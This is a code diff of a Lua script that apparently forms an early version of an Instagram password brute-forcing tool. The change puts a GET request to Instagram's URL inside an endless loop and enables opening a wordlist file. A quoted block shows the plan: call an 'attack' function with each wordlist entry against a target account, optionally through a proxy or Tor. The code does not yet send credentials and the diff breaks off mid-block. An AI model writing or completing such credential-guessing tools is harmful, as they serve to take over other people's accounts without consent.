@@ -39,18 +39,19 @@ local request_headers = {
 
 
 local function attack(victim, wordlist, tor, password)
-	local request_response = {}
-	local body, code, headers, status = http.request {
-		url = instagram_url_login,
-		method = "GET",
-		headers = request_headers,
-		--source = ltn12.source.string(request_payload),
-		sink = ltn12.sink.table(request_response)
-	}
-	print('body:' .. tostring(body))
-	print('code:' .. tostring(code))
-	print('status:' .. tostring(status))
-	print(table.concat(request_response))
+	while true do 
+		local request_response = {}
+		local body, code, headers, status, cookies = http.request {
+			url = instagram_url,
+			method = "GET",
+			headers = request_headers,
+			--source = ltn12.source.string(request_payload),
+			sink = ltn12.sink.table(request_response)
+		}
+		print("HTTP code:", code)
+		--print(table.concat(request_response) )
+		--print(table.concat(headers))
+	end
 end
 
 local function main() 
@@ -73,7 +74,7 @@ local function main()
 	end)
 	local args = parser:parse()
 	attack('hello', 'Hello', 'disable', 'hack')
-	--local open = io.open(args.wordlist, 'r')
+	local open = io.open(args.wordlist, 'r')
 	local test = [[if open then
 		for brute in io.lines(args.wordlist) do
 			attack(args.target, args.wordlist, args.proxy, brute)	
